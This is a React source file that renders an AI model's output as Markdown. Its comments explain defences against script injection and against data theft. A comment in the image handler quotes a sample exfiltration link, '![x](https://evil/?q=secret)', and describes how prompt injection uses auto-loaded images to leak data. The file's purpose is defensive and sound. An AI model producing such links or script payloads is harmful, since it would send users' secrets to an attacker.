// Model output → React elements. react-markdown builds a syntax tree and
// renders it as React elements; it never sets innerHTML, so raw HTML in the
// model's text (<script>, <img onerror>) is shown as text, not executed.

import { memo, type ComponentProps, type ReactElement } from "react";
import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { CodeBlock } from "./CodeBlock";

const components: Components = {
  // Fenced code: react-markdown wraps it as <pre><code class="language-x">.
  // We take over at <pre> so inline `code` keeps the plain styling.
  pre({ children }) {
    const code = children as ReactElement<{ className?: string; children?: unknown }>;
    const lang = /language-([\w+-]+)/.exec(code?.props?.className ?? "")?.[1];
    const text = String(code?.props?.children ?? "").replace(/\n$/, "");
    return <CodeBlock code={text} lang={lang} />;
  },
  a({ href, children }: ComponentProps<"a">) {
    // urlTransform (below) has already blanked javascript:/data: links.
    if (!href) return <span className="underline decoration-dotted">{children}</span>;
    return (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    );
  },
  // Don't auto-load images from model output. ![x](https://evil/?q=secret)
  // is a classic way for a prompt injection to leak data: the browser would
  // send the request the moment it renders. Show a link the user can choose
  // to open instead.
  img({ src, alt }: ComponentProps<"img">) {
    const safe = typeof src === "string" ? defaultUrlTransform(src) : "";
    return (
      <a href={safe || undefined} target="_blank" rel="noopener noreferrer nofollow" className="text-muted">
        [image: {alt || "untitled"}]
      </a>
    );
  },
};

const remarkPlugins = [remarkGfm];

// Not useDeferredValue: during a fast stream every new delta would interrupt
// the deferred render, and the text would freeze until the stream ends.
// Instead store.ts batches events to one render per animation frame.
function MarkdownImpl({ text }: { text: string }) {
  return (
    <div className="md leading-relaxed">
      <ReactMarkdown remarkPlugins={remarkPlugins} components={components} urlTransform={defaultUrlTransform}>
        {text}
      </ReactMarkdown>
    </div>
  );
}

export const Markdown = memo(MarkdownImpl);
